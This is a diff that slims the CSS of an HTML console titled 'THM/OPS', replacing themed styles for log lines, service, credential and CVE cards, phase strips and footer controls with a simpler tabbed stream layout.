@@ -3,11 +3,10 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>THM/OPS — Tactical Console</title>
+<title>THM/OPS</title>
 <style>
-  /* ---------- ROOT / RESET ---------- */
   *,*::before,*::after { box-sizing: border-box; margin:0; padding:0; }
-  html,body { height:100%; width:100%; overflow:hidden; }
+  html, body { height: 100%; width: 100%; overflow: hidden; }
   body {
     font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
     font-size: 12px;
@@ -15,535 +14,141 @@
     color: var(--fg);
     background: var(--bg);
     -webkit-font-smoothing: antialiased;
-    user-select: text;
   }
-  button, input, select, textarea {
-    font: inherit;
-    color: inherit;
-    background: transparent;
-    border: 1px solid var(--line);
-    border-radius: 1px;
-    padding: 4px 8px;
-    outline: none;
+
+  body[data-theme="tactical"] {
+    --bg:        #07090d;
+    --bg-2:      #0c1116;
+    --bg-3:      #11171e;
+    --fg:        #b9c6cf;
+    --fg-dim:    #6c7c87;
+    --accent:    #5cb8d8;
+    --accent-2:  #d4a857;
+    --good:      #4ea877;
+    --bad:       #c25656;
+    --line:      #1b2530;
+    --line-2:    #283341;
   }
-  button { cursor: pointer; }
-  button:hover { background: var(--hover); }
+  body[data-theme="pro"] {
+    --bg:        #d8d6d2;
+    --bg-2:      #e4e2de;
+    --bg-3:      #ccc9c3;
+    --fg:        #1f1d1b;
+    --fg-dim:    #6a655e;
+    --accent:    #c4501a;
+    --accent-2:  #1e40af;
+    --good:      #166534;
+    --bad:       #991b1b;
+    --line:      #b4b0a8;
+    --line-2:    #a09b92;
+  }
   ::selection { background: var(--accent); color: var(--bg); }
 
-  /* ---------- THEMES ---------- */
-  body[data-theme="tactical"] {
-    --bg: #07090d;
-    --bg-2: #0c1116;
-    --bg-3: #11171e;
-    --fg: #b9c6cf;
-    --fg-dim: #6c7c87;
-    --accent: #5cb8d8;
-    --accent-2: #d4a857;
-    --good: #4ea877;
-    --bad:  #c25656;
-    --warn: #d4a857;
-    --info: #5cb8d8;
-    --line: #1b2530;
-    --line-2: #283341;
-    --hover: #131a23;
-    --glow: none;
-    --scan: transparent;
-  }
-  body[data-theme="neon"] {
-    --bg: #000;
-    --bg-2: #060010;
-    --bg-3: #08001a;
-    --fg: #c9f7ff;
-    --fg-dim: #5a7585;
-    --accent: #00e5ff;
-    --accent-2: #d946ef;
-    --good: #00ffa3;
-    --bad:  #ff3b6b;
-    --warn: #ffd166;
-    --info: #00e5ff;
-    --line: #163040;
-    --line-2: #1f4258;
-    --hover: #0a1622;
-    --glow: 0 0 6px currentColor;
-    --scan: rgba(0,229,255,0.04);
-  }
-  body[data-theme="neon"] {
-    background:
-      radial-gradient(ellipse at top, rgba(0,229,255,0.06), transparent 60%),
-      linear-gradient(rgba(0,229,255,0.03) 1px, transparent 1px) 0 0 / 100% 28px,
-      linear-gradient(90deg, rgba(0,229,255,0.03) 1px, transparent 1px) 0 0 / 28px 100%,
-      #000;
-  }
-  body[data-theme="neon"] .glow-text { text-shadow: var(--glow); }
-  body[data-theme="neon"]::after {
-    content: "";
-    position: fixed; inset:0;
-    background: repeating-linear-gradient(0deg, var(--scan) 0 2px, transparent 2px 4px);
-    pointer-events: none;
-    animation: scan 6s linear infinite;
-    z-index: 9999;
-  }
-  @keyframes scan { from { background-position:0 0 } to { background-position:0 100vh } }
-
-  /* ---------- PRO THEME (light, Burp-style) ---------- */
-  body[data-theme="pro"] {
-    --bg:       #d8d6d2;   /* warm mid-light gray — the page */
-    --bg-2:     #e4e2de;   /* panels (topbar, footer, pane heads, cards) */
-    --bg-3:     #ccc9c3;   /* recessed surfaces (selects, input bg, svc body) */
-    --fg:       #1f1d1b;
-    --fg-dim:   #6a655e;
-    --accent:   #c4501a;   /* burp orange, slightly desaturated for the warmer ground */
-    --accent-2: #1e40af;
-    --good:     #166534;
-    --bad:      #991b1b;
-    --warn:     #92400e;
-    --info:     #1e40af;
-    --line:     #b4b0a8;
-    --line-2:   #a09b92;
-    --hover:    #ccc9c3;
-    --glow:     none;
-    --scan:     transparent;
-    font-family: -apple-system, "SF Pro Text", "Inter", system-ui, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    font-size: 13px;
-  }
-  body[data-theme="pro"] { background: var(--bg); }
-  /* Override most scifi flourishes when pro is active */
-  body[data-theme="pro"] .h-label,
-  body[data-theme="pro"] .h-title {
-    letter-spacing: 0.04em;
-    text-transform: none;
-    font-size: 12px;
-    font-weight: 600;
-    color: var(--fg);
-  }
-  body[data-theme="pro"] .h-label { color: var(--fg-dim); font-weight: 500; }
-  body[data-theme="pro"] code,
-  body[data-theme="pro"] .mono,
-  body[data-theme="pro"] .log-line .msg,
-  body[data-theme="pro"] #op-name,
-  body[data-theme="pro"] .svc-port,
-  body[data-theme="pro"] .cred-row .v,
-  body[data-theme="pro"] .intel-row .v,
-  body[data-theme="pro"] .cve-id,
-  body[data-theme="pro"] .cve-vec,
-  body[data-theme="pro"] .cve-score {
-    font-family: ui-monospace, "SF Mono", "JetBrains Mono", Menlo, Consolas, monospace;
-  }
-  body[data-theme="pro"] #brand { letter-spacing: 0.08em; color: var(--accent); font-weight: 700; }
-  body[data-theme="pro"] .tab {
-    letter-spacing: 0.02em;
-    text-transform: none;
-    font-size: 12px;
-    font-weight: 500;
-    border-right-color: var(--line-2);
-  }
-  body[data-theme="pro"] .tab:first-child { border-left-color: var(--line-2); }
-  body[data-theme="pro"] .tab.active {
-    background: var(--bg);
-    color: var(--accent);
-    box-shadow: inset 0 -2px 0 var(--accent), inset 0 2px 0 transparent;
-    border-bottom: 1px solid var(--bg);
-  }
-  body[data-theme="pro"] .tab .badge {
-    background: var(--bg);
-    color: var(--accent-2);
-    border-color: var(--line-2);
-    font-weight: 600;
-    letter-spacing: 0;
-  }
-  body[data-theme="pro"] .topcell {
-    background: var(--bg-2);
-    border-color: var(--line-2);
-  }
-  body[data-theme="pro"] .topcell .k { letter-spacing: 0.04em; text-transform: none; font-weight: 500; color: var(--fg-dim); }
-  body[data-theme="pro"] .topcell .v.accent { color: var(--accent); }
-  body[data-theme="pro"] .topcell .v.amber  { color: var(--warn); }
-  body[data-theme="pro"] .btn-primary {
-    background: var(--accent);
-    color: #fff;
-    border-color: var(--accent);
-    letter-spacing: 0.02em;
-    text-transform: none;
-    font-weight: 600;
-  }
-  body[data-theme="pro"] .btn-primary:hover { background: #b8451a; border-color: #b8451a; color: #fff; }
-  body[data-theme="pro"] .btn-ghost {
-    background: var(--bg-2);
-    color: var(--fg);
-    border-color: var(--line-2);
-    letter-spacing: 0.02em;
-    text-transform: none;
-    font-weight: 500;
-  }
-  body[data-theme="pro"] .btn-ghost:hover { background: var(--bg-3); color: var(--accent); border-color: var(--accent); }
-  body[data-theme="pro"] #phase-strip { background: var(--bg-2); }
-  body[data-theme="pro"] .phase {
-    background: var(--bg);
-    border-color: var(--line-2);
-  }
-  body[data-theme="pro"] .phase .name { letter-spacing: 0.02em; text-transform: none; font-size: 12px; font-weight: 600; color: var(--fg); }
-  body[data-theme="pro"] .phase .idx,
-  body[data-theme="pro"] .phase .sub { letter-spacing: 0.04em; color: var(--fg-dim); }
-  body[data-theme="pro"] .phase.active { background: rgba(214,83,26,0.06); }
-  body[data-theme="pro"] .phase.active .name { color: var(--accent); }
-  body[data-theme="pro"] .phase.done { background: rgba(21,128,61,0.06); }
-  body[data-theme="pro"] .phase.done .name { color: var(--good); }
-  body[data-theme="pro"] .phase.active::after { background: var(--accent); }
-  body[data-theme="pro"] #phase-strip .phase:not(:last-child)::before {
-    background: var(--bg-2);
-    color: var(--line-2);
-  }
-  body[data-theme="pro"] .pane-head { background: var(--bg-2); }
-  body[data-theme="pro"] .log-line .src { letter-spacing: 0; text-transform: none; font-weight: 600; font-size: 10px; }
-  body[data-theme="pro"] .log-line .ts { color: var(--fg-dim); }
-  body[data-theme="pro"] .log-line .msg { font-size: 12px; color: var(--fg); }
-  body[data-theme="pro"] .src-ops    { color: var(--accent)   !important; border-color: var(--accent)   !important; }
-  body[data-theme="pro"] .src-claude { color: var(--accent-2) !important; border-color: var(--accent-2) !important; }
-  body[data-theme="pro"] .src-you    { color: var(--fg)       !important; border-color: var(--line-2)   !important; }
-  body[data-theme="pro"] .src-tool   { color: #6b21a8         !important; border-color: #6b21a8         !important; }
-  body[data-theme="pro"] .src-result { color: var(--good)     !important; border-color: var(--good)     !important; }
-  body[data-theme="pro"] #op-name { letter-spacing: 0; font-size: 18px; color: var(--accent); font-weight: 700; }
-  body[data-theme="pro"] #op-tagline { font-style: normal; color: var(--fg-dim); }
-  body[data-theme="pro"] .op-section .lab { letter-spacing: 0.04em; text-transform: none; font-weight: 600; color: var(--fg); }
-  body[data-theme="pro"] .op-section ul li::before { color: var(--accent); }
-  body[data-theme="pro"] .svc-card { background: var(--bg-2); border-color: var(--line-2); }
-  body[data-theme="pro"] .svc-card:hover { border-color: var(--line); }
-  body[data-theme="pro"] .svc-card.open { border-color: var(--accent); }
-  body[data-theme="pro"] .svc-name { letter-spacing: 0; text-transform: none; font-weight: 600; }
-  body[data-theme="pro"] .svc-port { color: var(--good); font-weight: 700; }
-  body[data-theme="pro"] .svc-body { background: var(--bg-3); }
-  body[data-theme="pro"] .svc-vector { background: var(--bg-2); border-color: var(--line); }
-  body[data-theme="pro"] .svc-vector code { color: var(--accent-2); }
-  body[data-theme="pro"] .dossier-kv .k { letter-spacing: 0.02em; text-transform: none; font-weight: 500; color: var(--fg-dim); }
-  body[data-theme="pro"] .toolkit button { background: var(--bg-2); border-color: var(--line-2); color: var(--fg); }
-  body[data-theme="pro"] .toolkit button:hover { border-color: var(--accent); color: var(--accent); background: var(--bg-3); }
-  body[data-theme="pro"] .toolkit button .tag { letter-spacing: 0.04em; }
-  body[data-theme="pro"] .tip { background: var(--bg-2); }
-  body[data-theme="pro"] .tip b { color: var(--accent); }
-  body[data-theme="pro"] #footer { background: var(--bg-2); color: var(--fg-dim); letter-spacing: 0; }
-  body[data-theme="pro"] #footer select { background: var(--bg); color: var(--fg); border-color: var(--line-2); }
-  body[data-theme="pro"] #footer a { color: var(--accent-2); }
-  body[data-theme="pro"] #status-led { background: var(--bg-2); border-color: var(--line-2); }
-  body[data-theme="pro"] #status-led.live .led { background: var(--good); }
-  body[data-theme="pro"] .toast { background: var(--bg-2); border-color: var(--good); color: var(--good); letter-spacing: 0; text-transform: none; font-weight: 600; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
-  body[data-theme="pro"] .toast.warn { border-color: var(--warn); color: var(--warn); }
-  body[data-theme="pro"] .toast.bad  { border-color: var(--bad);  color: var(--bad); }
-  body[data-theme="pro"] .intel-group { background: var(--bg-2); border-color: var(--line-2); }
-  body[data-theme="pro"] .intel-group-head { background: var(--bg-3); border-bottom-color: var(--line-2); }
-  body[data-theme="pro"] .intel-group-head .lab { letter-spacing: 0.02em; text-transform: none; color: var(--accent); font-weight: 600; }
-  body[data-theme="pro"] .intel-row .k { letter-spacing: 0; text-transform: none; color: var(--fg-dim); font-weight: 500; }
-  body[data-theme="pro"] .cred-card { background: var(--bg-2); border-color: var(--line-2); }
-  body[data-theme="pro"] .cred-card .cred-svc { letter-spacing: 0; text-transform: none; color: var(--accent); font-weight: 600; }
-  body[data-theme="pro"] .cred-row .k { letter-spacing: 0; text-transform: none; color: var(--fg-dim); font-weight: 500; }
-  body[data-theme="pro"] .cve-card { background: var(--bg-2); border-color: var(--line-2); }
-  body[data-theme="pro"] .cve-sev-badge { letter-spacing: 0; text-transform: none; font-weight: 600; }
-  body[data-theme="pro"] .cve-meta { letter-spacing: 0; text-transform: none; }
-  body[data-theme="pro"] #heartbeat { background: var(--bg-2); border-color: var(--line-2); opacity: 0.6; }
-  body[data-theme="pro"] ::selection { background: rgba(214,83,26,0.25); color: var(--fg); }
-  body[data-theme="pro"] .glow-text { text-shadow: none; }
-  body[data-theme="pro"] #row-resizer { background: var(--line); }
-  body[data-theme="pro"] #row-resizer:hover, body[data-theme="pro"] #row-resizer.dragging { background: var(--accent); }
-  body[data-theme="pro"] #row-resizer::before { background: var(--line-2); }
-
-  /* ---------- TYPOGRAPHY ---------- */
-  .h-label {
-    text-transform: uppercase;
-    letter-spacing: 0.2em;
-    font-size: 10px;
-    color: var(--fg-dim);
-  }
-  .h-title {
-    text-transform: uppercase;
-    letter-spacing: 0.18em;
-    font-size: 11px;
-    color: var(--accent);
-  }
-  body[data-theme="neon"] .h-title { text-shadow: var(--glow); }
-
-  /* ---------- LAYOUT ROOTS ---------- */
   #app {
     display: grid;
-    grid-template-rows: 56px 32px 80px 1fr 28px;
+    grid-template-rows: 36px 1fr 24px;
     height: 100vh;
-    width: 100vw;
   }
 
-  /* ---------- TOPBAR ---------- */
-  #topbar {
+  #tabs {
     display: flex;
-    align-items: center;
-    gap: 18px;
-    padding: 0 14px;
+    align-items: stretch;
     border-bottom: 1px solid var(--line);
     background: var(--bg-2);
   }
   #brand {
-    display:flex; align-items:center; gap:8px;
-    font-weight:700;
-    letter-spacing:0.22em;
+    display: flex; align-items: center;
+    padding: 0 14px;
     color: var(--accent);
-  }
-  body[data-theme="neon"] #brand { text-shadow: var(--glow); }
-  #brand .dot {
-    width:8px; height:8px;
-    background: var(--accent);
-    border-radius: 50%;
-    box-shadow: var(--glow);
-  }
-  .topcell {
-    display:flex; align-items:center; gap:6px;
-    padding: 4px 10px;
-    border: 1px solid var(--line);
-    border-radius: 1px;
-    background: var(--bg-3);
-    min-width: 70px;
-  }
-  .topcell .k { color: var(--fg-dim); font-size:10px; letter-spacing:0.18em; text-transform: uppercase; }
-  .topcell .v { color: var(--fg); font-weight:600; }
-  .topcell .v.accent { color: var(--accent); }
-  .topcell .v.amber { color: var(--accent-2); }
-  #spacer { flex: 1; }
-  #status-led {
-    display:flex; align-items:center; gap:8px;
-    padding: 4px 10px;
-    border: 1px solid var(--line);
-    background: var(--bg-3);
-  }
-  #status-led .led {
-    width: 8px; height:8px; border-radius:50%;
-    background: var(--fg-dim);
-  }
-  #status-led.live .led {
-    background: var(--good);
-    animation: pulse 1.4s ease-in-out infinite;
-    box-shadow: var(--glow);
-  }
-  @keyframes pulse {
-    0%,100% { opacity: 1; transform: scale(1); }
-    50% { opacity: 0.4; transform: scale(0.7); }
-  }
-  .btn-primary {
-    border-color: var(--accent);
-    color: var(--accent);
-    padding: 4px 12px;
-    letter-spacing: 0.15em;
-    text-transform: uppercase;
-    font-size: 11px;
-  }
-  .btn-primary:hover { background: var(--accent); color: var(--bg); }
-  .btn-ghost {
-    border-color: var(--line-2);
-    color: var(--fg-dim);
-    padding: 4px 10px;
-    letter-spacing: 0.15em;
-    text-transform: uppercase;
-    font-size: 11px;
-  }
-  .btn-ghost:hover { color: var(--fg); border-color: var(--fg); }
-
-  /* ---------- TABS ---------- */
-  #tabs {
-    display:flex;
-    border-bottom: 1px solid var(--line);
-    background: var(--bg-2);
-    padding: 0 12px;
-  }
-  .tab {
-    padding: 0 18px;
-    height: 100%;
-    display:flex; align-items:center; gap:8px;
-    color: var(--fg-dim);
-    text-transform: uppercase;
-    letter-spacing: 0.18em;
+    letter-spacing: 0.22em;
+    font-weight: 700;
     font-size: 11px;
     border-right: 1px solid var(--line);
-    cursor: pointer;
-    background: transparent;
-    border-top: none; border-bottom: none; border-left: none;
-    border-radius: 0;
   }
-  .tab:first-child { border-left: 1px solid var(--line); }
+  #brand .dot {
+    width: 7px; height: 7px;
+    background: var(--accent);
+    border-radius: 50%;
+    margin-right: 8px;
+  }
+  .tab {
+    background: transparent;
+    color: var(--fg-dim);
+    border: none;
+    border-right: 1px solid var(--line);
+    padding: 0 16px;
+    font-family: inherit;
+    font-size: 10px;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .tab:hover { color: var(--fg); }
   .tab.active {
     color: var(--accent);
     background: var(--bg-3);
     box-shadow: inset 0 2px 0 var(--accent);
   }
-  body[data-theme="neon"] .tab.active { text-shadow: var(--glow); }
   .tab .badge {
     padding: 1px 6px;
     border: 1px solid var(--line-2);
     background: var(--bg);
     color: var(--accent-2);
     font-size: 10px;
-    letter-spacing: 0.1em;
+    letter-spacing: 0.05em;
+    font-weight: 600;
   }
-
-  /* ---------- PHASE STRIP ---------- */
-  #phase-strip {
-    display: grid;
-    grid-template-columns: repeat(6, 1fr);
-    gap: 6px;
-    padding: 8px 14px;
-    border-bottom: 1px solid var(--line);
-    background: var(--bg-2);
-    align-items: stretch;
-  }
-  .phase {
-    position: relative;
-    padding: 8px 10px;
-    border: 1px solid var(--line);
-    background: var(--bg-3);
-    display: flex; flex-direction: column; gap: 2px;
-    overflow: hidden;
-  }
-  .phase .idx {
-    font-size: 10px;
+  #right { flex: 1; display: flex; align-items: center; justify-content: flex-end; padding: 0 14px; gap: 12px; }
+  #status, #count {
     color: var(--fg-dim);
-    letter-spacing: 0.2em;
-  }
-  .phase .name {
-    font-size: 11px;
-    font-weight: 700;
+    font-size: 10px;
+    letter-spacing: 0.18em;
     text-transform: uppercase;
-    letter-spacing: 0.12em;
-    color: var(--fg);
   }
-  .phase .sub {
-    font-size: 10px;
+  #clear {
+    background: transparent;
     color: var(--fg-dim);
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-  }
-  .phase.done {
-    background: rgba(78,168,119,0.08);
-    border-color: var(--good);
-  }
-  .phase.done .idx::before { content: "✓ "; color: var(--good); }
-  .phase.done .name { color: var(--good); }
-  .phase.done .elapsed {
-    position:absolute; right:8px; top:6px;
-    font-size: 10px; color: var(--good);
-  }
-  .phase.active {
-    border-color: var(--accent);
-    background: rgba(92,184,216,0.06);
-  }
-  .phase.active .name { color: var(--accent); }
-  body[data-theme="neon"] .phase.active .name { text-shadow: var(--glow); }
-  .phase.active::after {
-    content: "";
-    position: absolute;
-    left: 0; bottom: 0;
-    height: 2px; width: 30%;
-    background: var(--accent);
-    animation: scanbar 1.6s ease-in-out infinite;
-    box-shadow: var(--glow);
-  }
-  @keyframes scanbar {
-    0% { left: -30%; }
-    100% { left: 100%; }
-  }
-  /* connectors */
-  #phase-strip .phase:not(:last-child)::before {
-    content: "▸";
-    position: absolute;
-    right: -10px; top: 50%;
-    transform: translate(0, -50%);
-    color: var(--line-2);
-    z-index: 2;
-    background: var(--bg-2);
-    padding: 0 2px;
-  }
-
-  /* ---------- MAIN GRID ---------- */
-  #main {
-    display: grid;
-    grid-template-rows: var(--row1, 62%) 6px 1fr;
-    background: var(--line);
-    overflow: hidden;
-    min-height: 0;
-  }
-  #main > #telemetry,
-  #main > #row2 { background: var(--bg); min-height: 0; }
-  #row-resizer {
-    background: var(--line);
-    cursor: row-resize;
-    position: relative;
-    border-top: 1px solid var(--line);
-    border-bottom: 1px solid var(--line);
-    transition: background 0.15s;
-  }
-  #row-resizer:hover, #row-resizer.dragging {
-    background: var(--accent);
-  }
-  #row-resizer::before {
-    content: "";
-    position: absolute;
-    left: 50%; top: 50%;
-    transform: translate(-50%, -50%);
-    width: 36px; height: 2px;
-    background: var(--line-2);
+    border: 1px solid var(--line-2);
     border-radius: 1px;
+    padding: 3px 10px;
+    font-family: inherit;
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    cursor: pointer;
   }
-  #row-resizer:hover::before, #row-resizer.dragging::before { background: var(--bg); }
-  body.row-resizing { cursor: row-resize; user-select: none; }
-  body.row-resizing iframe { pointer-events: none; }
-  #row2 {
-    display: grid;
-    grid-template-columns: 1fr 1fr 1fr;
-    gap: 1px;
-    background: var(--line);
-    min-height: 0;
-  }
-  #row2 > * { background: var(--bg); min-height: 0; }
+  #clear:hover { color: var(--fg); border-color: var(--fg); }
 
   .pane {
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-    min-height: 0;
-  }
-  .pane-head {
-    display: flex; align-items: center; gap: 10px;
-    padding: 8px 12px;
-    border-bottom: 1px solid var(--line);
-    background: var(--bg-2);
-    min-height: 32px;
-  }
-  .pane-head .h-title { flex: 0 0 auto; }
-  .pane-head .spacer { flex: 1; }
-  .pane-body {
-    flex: 1 1 0;
     overflow-y: auto;
     overflow-x: hidden;
-    padding: 8px 12px;
-    min-height: 0;
+    padding: 8px 14px;
+    background: var(--bg);
+    display: none;
   }
-  .pane-body::-webkit-scrollbar { width: 8px; }
-  .pane-body::-webkit-scrollbar-track { background: var(--bg-2); }
-  .pane-body::-webkit-scrollbar-thumb { background: var(--line-2); border-radius: 1px; }
+  .pane.active { display: block; }
+  .pane::-webkit-scrollbar { width: 8px; }
+  .pane::-webkit-scrollbar-track { background: var(--bg-2); }
+  .pane::-webkit-scrollbar-thumb { background: var(--line-2); border-radius: 1px; }
 
-  /* ---------- TELEMETRY ---------- */
-  #telemetry .pane-body {
-    padding: 4px 12px;
-    font-size: 12px;
-  }
-  .log-line {
+  #pane-stream { padding: 6px 14px; }
+  .line {
     display: grid;
     grid-template-columns: 78px 70px 1fr;
-    gap: 8px;
+    gap: 10px;
     padding: 2px 0;
     align-items: baseline;
-    border-bottom: 1px dotted transparent;
-    animation: slidein 0.25s ease-out;
+    animation: slide 0.22s ease-out;
   }
-  @keyframes slidein {
-    from { opacity:0; transform: translateX(-12px); }
-    to   { opacity:1; transform: translateX(0); }
+  @keyframes slide {
+    from { opacity: 0; transform: translateX(-10px); }
+    to   { opacity: 1; transform: translateX(0); }
   }
-  .log-line .ts { color: var(--fg-dim); font-size: 10px; }
-  .log-line .src {
+  .ts { color: var(--fg-dim); font-size: 10px; }
+  .src {
     text-align: center;
     font-size: 10px;
     padding: 1px 4px;
@@ -552,515 +157,33 @@
     letter-spacing: 0.1em;
     text-transform: uppercase;
   }
-  .src-ops    { color: var(--accent) !important; border-color: var(--accent) !important; }
-  .src-claude { color: var(--accent-2) !important; border-color: var(--accent-2) !important; }
-  .src-you    { color: var(--fg) !important; border-color: var(--fg) !important; }
-  .src-tool   { color: var(--info) !important; border-color: var(--info) !important; }
-  .src-result { color: var(--good) !important; border-color: var(--good) !important; }
-  .log-line .msg {
-    color: var(--fg);
-    white-space: pre-wrap;
-    word-break: break-word;
-    font-family: ui-monospace, monospace;
-  }
-  .log-line.good .msg { color: var(--good); }
-  .log-line.warn .msg { color: var(--warn); }
-  .log-line.bad  .msg { color: var(--bad); }
-  .log-line.dim  .msg { color: var(--fg-dim); }
+  .src-ops    { color: var(--accent);   border-color: var(--accent); }
+  .src-claude { color: var(--accent-2); border-color: var(--accent-2); }
+  .src-you    { color: var(--fg);       border-color: var(--fg); }
+  .src-tool   { color: var(--accent);   border-color: var(--accent); }
+  .src-result { color: var(--good);     border-color: var(--good); }
+  .msg { color: var(--fg); white-space: pre-wrap; word-break: break-word; }
 
-  /* ---------- CURRENT OP ---------- */
-  #op-name {
-    font-size: 22px;
-    letter-spacing: 0.08em;
-    color: var(--accent);
-    font-weight: 700;
-    text-transform: uppercase;
-  }
-  body[data-theme="neon"] #op-name { text-shadow: var(--glow); }
-  #op-tagline {
+  /* credentials */
+  .empty {
     color: var(--fg-dim);
     font-size: 11px;
-    margin-top: 4px;
-    font-style: italic;
+    letter-spacing: 0.05em;
+    padding: 14px 4px;
   }
-  .op-section {
-    margin-top: 14px;
-  }
-  .op-section .lab {
-    color: var(--accent-2);
-    letter-spacing: 0.2em;
-    font-size: 10px;
-    text-transform: uppercase;
-    margin-bottom: 4px;
-  }
-  .op-section p {
-    color: var(--fg);
-    font-size: 12px;
-    line-height: 1.5;
-  }
-  .op-section ul {
-    list-style: none;
-    padding: 0;
-  }
-  .op-section ul li {
-    padding: 3px 0 3px 14px;
-    position: relative;
-    color: var(--fg);
-    font-size: 12px;
-  }
-  .op-section ul li::before {
-    content: "›";
-    position: absolute;
-    left: 0;
-    color: var(--accent);
-  }
-
-  /* ---------- SERVICES ---------- */
-  .svc-card {
+  .cred {
     border: 1px solid var(--line);
     background: var(--bg-2);
+    padding: 8px 12px;
     margin-bottom: 6px;
-    cursor: pointer;
-    transition: border-color 0.15s;
-  }
-  .svc-card:hover { border-color: var(--line-2); }
-  .svc-card.open { border-color: var(--accent); }
-  .svc-head {
-    display: grid;
-    grid-template-columns: 60px 1fr auto;
-    align-items: center;
-    gap: 8px;
-    padding: 8px 10px;
-  }
-  .svc-port {
-    font-weight: 700;
-    color: var(--good);
-    font-size: 13px;
-  }
-  .svc-name {
-    color: var(--fg);
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    font-size: 11px;
-  }
-  .svc-ver {
-    color: var(--fg-dim);
-    font-size: 10px;
-  }
-  .svc-caret { color: var(--fg-dim); font-size: 10px; }
-  .svc-body {
-    display: none;
-    border-top: 1px solid var(--line);
-    padding: 8px 10px;
-    background: var(--bg-3);
-  }
-  .svc-card.open .svc-body { display: block; }
-  .svc-body p { color: var(--fg-dim); font-size: 11px; margin-bottom: 8px; line-height: 1.4; }
-  .svc-vectors { display: flex; flex-direction: column; gap: 4px; }
-  .svc-vector {
-    display: grid;
-    grid-template-columns: 1fr auto;
-    align-items: center;
-    gap: 6px;
-    padding: 4px 6px;
-    border: 1px solid var(--line);
-    background: var(--bg);
-  }
-  .svc-vector code {
-    font-family: ui-monospace, monospace;
-    font-size: 11px;
-    color: var(--accent);
-    white-space: pre-wrap;
-    word-break: break-all;
-  }
-  .svc-vector .copy {
-    font-size: 9px;
-    padding: 2px 6px;
-    color: var(--fg-dim);
-    border-color: var(--line-2);
-  }
-  .svc-vector .copy:hover { color: var(--accent); border-color: var(--accent); }
-
-  /* ---------- DOSSIER ---------- */
-  .dossier-kv {
-    display: grid;
-    grid-template-columns: 90px 1fr;
-    gap: 4px 10px;
-    margin-bottom: 12px;
-    font-size: 11px;
-  }
-  .dossier-kv .k {
-    color: var(--fg-dim);
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    font-size: 10px;
-  }
-  .dossier-kv .v { color: var(--fg); word-break: break-all; }
-
-  .toolkit {
-    display: flex;
-    flex-direction: column;
-    gap: 4px;
-    margin-bottom: 12px;
-  }
-  .toolkit button {
-    text-align: left;
-    padding: 6px 10px;
-    border-color: var(--line-2);
-    color: var(--fg);
-    font-size: 11px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-  }
-  .toolkit button:hover {
-    border-color: var(--accent);
-    color: var(--accent);
-  }
-  .toolkit button .tag {
-    font-size: 9px;
-    color: var(--fg-dim);
-    letter-spacing: 0.15em;
-  }
-
-  .tip {
-    border: 1px dashed var(--line-2);
-    padding: 8px 10px;
-    color: var(--fg-dim);
-    font-size: 11px;
-    line-height: 1.5;
-  }
-  .tip b { color: var(--accent-2); font-weight: 600; }
-
-  /* ---------- FOOTER ---------- */
-  #footer {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    padding: 0 14px;
-    border-top: 1px solid var(--line);
-    background: var(--bg-2);
-    font-size: 10px;
-    color: var(--fg-dim);
-    letter-spacing: 0.1em;
-  }
-  #footer select {
-    background: var(--bg-3);
-    border-color: var(--line);
-    padding: 2px 6px;
-    font-size: 11px;
-    color: var(--fg);
-  }
-  #footer #btn-theme {
-    padding: 2px 10px;
-    font-size: 10px;
-    border-color: var(--line-2);
-    color: var(--fg-dim);
-    letter-spacing: 0.15em;
-    text-transform: uppercase;
-  }
-  #footer #btn-theme:hover { color: var(--accent); border-color: var(--accent); }
-  #footer a {
-    color: var(--accent);
-    text-decoration: none;
-    margin-left: auto;
-  }
-  #footer a:hover { text-decoration: underline; }
-
-  /* ---------- CREDS + INTEL + CVES VIEW shared layout ---------- */
-  #creds, #intel, #cves {
-    display: none;
-    grid-template-columns: 2fr 1fr;
-    gap: 1px;
-    background: var(--line);
-    overflow: hidden;
-    min-height: 0;
-    grid-row: 3 / 5;
-  }
-  #creds.show, #intel.show, #cves.show { display: grid; }
-  #creds > *, #intel > *, #cves > * { background: var(--bg); min-height: 0; }
-
-  /* ---------- CVE cards ---------- */
-  .cve-card {
-    border: 1px solid var(--line);
-    background: var(--bg-2);
-    margin-bottom: 10px;
-    border-left: 3px solid var(--line-2);
-  }
-  .cve-card.sev-critical { border-left-color: var(--bad);  background: linear-gradient(90deg, rgba(194,86,86,0.10), var(--bg-2) 40%); }
-  .cve-card.sev-high     { border-left-color: var(--warn); background: linear-gradient(90deg, rgba(212,168,87,0.10), var(--bg-2) 40%); }
-  .cve-card.sev-medium   { border-left-color: var(--accent); }
-  .cve-card.sev-low      { border-left-color: var(--fg-dim); }
-  .cve-card.sev-loading  { border-left-color: var(--line-2); }
-  .cve-card .cve-head {
-    display: grid;
-    grid-template-columns: auto auto 1fr auto auto;
-    align-items: center;
-    gap: 10px;
-    padding: 8px 12px;
-    border-bottom: 1px dotted var(--line);
-  }
-  .cve-card .cve-id {
-    font-weight: 700;
-    color: var(--accent);
-    font-size: 13px;
-    letter-spacing: 0.06em;
-  }
-  body[data-theme="neon"] .cve-card .cve-id { text-shadow: var(--glow); }
-  .cve-card.sev-critical .cve-id { color: var(--bad); }
-  .cve-card.sev-high     .cve-id { color: var(--warn); }
-  .cve-sev-badge {
-    padding: 2px 8px;
-    font-size: 10px;
-    letter-spacing: 0.15em;
-    text-transform: uppercase;
-    border: 1px solid currentColor;
-    color: var(--fg-dim);
-  }
-  .cve-card.sev-critical .cve-sev-badge { color: var(--bad); }
-  .cve-card.sev-high     .cve-sev-badge { color: var(--warn); }
-  .cve-card.sev-medium   .cve-sev-badge { color: var(--accent); }
-  .cve-card.sev-low      .cve-sev-badge { color: var(--fg-dim); }
-  .cve-score {
-    font-family: ui-monospace, monospace;
-    font-size: 12px;
-    color: var(--fg);
-    font-weight: 700;
-  }
-  .cve-card.sev-critical .cve-score { color: var(--bad); }
